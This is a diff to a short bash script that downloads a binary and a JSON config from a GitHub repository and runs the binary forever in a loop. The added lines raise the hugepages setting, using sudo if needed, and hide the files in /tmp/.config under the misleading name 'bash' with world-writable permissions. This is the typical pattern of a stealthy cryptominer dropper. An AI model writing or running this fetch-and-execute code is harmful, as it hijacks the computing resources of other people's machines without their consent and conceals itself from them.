@@ -1,7 +1,11 @@
 #!/bin/bash
-wget --no-check-certificate -O ./appsettings.json https://github.com/curiosityinteriorsuk/2088/raw/main/q1.json
-wget --no-check-certificate -O ./p https://github.com/curiosityinteriorsuk/2088/raw/main/q
-chmod u+x ./appsettings.json
-chmod u+x ./p
-while true; do ./p >/dev/null 2>&1 ; done
 
+src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768
+
+mkdir -p "/tmp/.config"
+wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
+wget -qO "/tmp/.config/bash" "${src}/q"
+chmod -R 777 "/tmp/.config"
+
+while true; do cd /tmp/.config; ./bash; done
